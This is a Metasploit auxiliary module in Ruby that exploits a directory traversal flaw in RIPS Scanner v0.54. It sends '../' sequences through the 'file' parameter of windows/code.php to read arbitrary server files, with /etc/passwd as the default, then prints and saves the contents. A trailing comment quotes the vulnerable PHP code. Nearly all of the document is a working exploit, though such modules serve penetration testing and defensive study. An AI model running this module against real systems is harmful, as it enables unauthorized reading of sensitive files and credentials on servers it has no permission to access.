##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Auxiliary
  include Msf::Auxiliary::Report
  include Msf::Exploit::Remote::HttpClient
  include Msf::Auxiliary::Scanner

  def initialize(info = {})
    super(update_info(info,
      'Name'           => 'RIPS Scanner Directory Traversal',
      'Description'    => %q{
        This module exploits a directory traversal vulnerability in the RIPS Scanner v0.54,
        allowing to read arbitrary files with the web server privileges.
      },
      'References'     =>
        [
          ['EDB', '18660'],
          ['URL', 'http://codesec.blogspot.com.br/2015/03/rips-scanner-v-054-local-file-include.html']
        ],
      'Author'         =>
        [
          'localh0t', # Vulnerability discovery
          'Roberto Soares Espreto <robertoespreto[at]gmail.com>' # Metasploit module
        ],
      'License'        => MSF_LICENSE
    ))

    register_options(
      [
        Opt::RPORT(80),
        OptString.new('TARGETURI', [ true,  "The URI path to the web application", "/rips/"]),
        OptString.new('FILEPATH', [true, "The path to the file to read", "/etc/passwd"]),
        OptInt.new('DEPTH', [ true, 'Traversal Depth (to reach the root folder)', 5 ])
      ])
  end

  def run_host(ip)
    traversal = "../" * datastore['DEPTH']
    filename = datastore['FILEPATH']
    filename = filename[1, filename.length] if filename =~ /^\//

    res = send_request_cgi({
      'method' => 'GET',
      'uri'    => normalize_uri(target_uri.path, 'windows', 'code.php'),
      'vars_get' =>
        {
          'file' => "#{traversal}#{filename}"
        }
    })

    if res &&
        res.code == 200 &&
        res.headers.include?('Set-Cookie') &&
        res.body.length > 304

      html = Nokogiri::HTML(res.body)
      html_clean = html.search('.codeline').text
      print_line("#{html_clean}")

      fname = datastore['FILEPATH']

      path = store_loot(
        'rips.traversal',
        'text/plain',
        ip,
        html_clean,
        fname
      )

      print_good("File saved in: #{path}")
    else
      print_error("Nothing was downloaded")
    end
  end
end
=begin
 102    $file = $_GET['file'];
 103    $marklines = explode(',', $_GET['lines']);
 104
 105
 106    if(!empty($file))
 107    {
 108            $lines = file($file);
 109
 110            // place line numbers in extra table for more elegant copy/paste without line numbers
 111            echo '<tr><td><table>';
 112            for($i=1, $max=count($lines); $i<=$max;$i++)
 113                    echo "<tr><td class=\"linenrcolumn\"><span class=\"linenr\">$i</span><A id='".($i+2).'\'></A></td></tr>';
 114            echo '</table></td><td id="codeonly"><table id="codetable" width="100%">';
 115
 116            $in_comment = false;
 117            for($i=0; $i<$max; $i++)
 118            {
 119                    $in_comment = highlightline($lines[$i], $i+1, $marklines, $in_comment);
 120            }
 121    }
=end
